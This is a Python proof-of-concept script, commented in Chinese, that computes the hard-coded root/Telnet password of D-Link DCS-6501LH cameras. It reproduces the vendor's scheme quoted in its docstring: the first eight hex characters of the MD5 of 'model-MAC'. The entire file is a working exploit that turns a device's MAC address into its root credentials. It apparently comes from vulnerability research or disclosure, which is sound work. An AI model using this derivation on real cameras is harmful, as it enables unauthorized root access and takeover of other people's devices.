#!/usr/bin/env python3
"""DCS-6501LH 可预测 root/Telnet 口令推导器（与厂商 aoni_ipc 中的算法一致）
   厂商实现：echo -n "<model>-<MAC_UPPER>" > /tmp/tmp_pwd ;
             echo $(md5sum /tmp/tmp_pwd | head -c 8) > /tmp/pwd ;
             echo $(md5sum /tmp/tmp_pwd | head -c 8) >> /tmp/pwd ;
             passwd root < /tmp/pwd
   用法: python3 poc_dcs6501lh_root_pwd.py <MAC>            # 例: 12:32:45:78:45:22
        python3 poc_dcs6501lh_root_pwd.py <MAC> <MODEL>    # 默认型号 DCS-6501LH
"""
import hashlib, sys
mac = sys.argv[1] if len(sys.argv) > 1 else "12:32:45:78:45:22"
model = sys.argv[2] if len(sys.argv) > 2 else "DCS-6501LH"
raw = f"{model}-{mac.upper()}"
digest = hashlib.md5(raw.encode()).hexdigest()
pwd = digest[:8]
print(f"model          = {model}")
print(f"mac (input)    = {mac}")
print(f"raw input      = {raw}")
print(f"md5            = {digest}")
print(f"root password  = {pwd}")
